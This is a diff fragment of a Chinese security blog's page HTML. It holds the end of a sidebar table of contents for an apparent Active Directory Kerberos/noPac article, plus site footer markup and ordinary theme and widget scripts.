class="nav-number">5.7.</span> <span class="nav-text">获取票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E7%9A%84NTLM-Hash"><span class="nav-number">5.8.</span> <span class="nav-text">获取krbtgt用户的NTLM Hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E7%A5%A8%E6%8D%AE"><span class="nav-number">5.9.</span> <span class="nav-text">清除票据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#noPac"><span class="nav-number">6.</span> <span class="nav-text">noPac</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B8%A9%E5%AE%8C%E7%9A%84%E5%90%8E%E7%9A%84%E5%88%A9%E7%94%A8%E3%80%82%E3%80%82%E3%80%82"><span class="nav-number">6.1.</span> <span class="nav-text">踩完的后的利用。。。</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B"><span class="nav-number">6.1.1.</span> <span class="nav-text">扫描探测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">6.1.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#noPac%EF%BC%88python%EF%BC%89"><span class="nav-number">6.2.</span> <span class="nav-text">noPac（python）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Sam-the-admin"><span class="nav-number">6.3.</span> <span class="nav-text">Sam_the_admin</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mamor"
+      src="/images/kabi.jpg">
+  <p class="site-author-name" itemprop="name">Mamor</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">106</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Mamor5409" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Mamor5409" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mamor</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">309k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:41</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+<!--
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共83.2k字</span>
+</div>
+-->
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/ClickShowText.js"></script>
+
+<script type="text/javascript">
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<a href="https://mamor5409.github.io/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+</html>
+
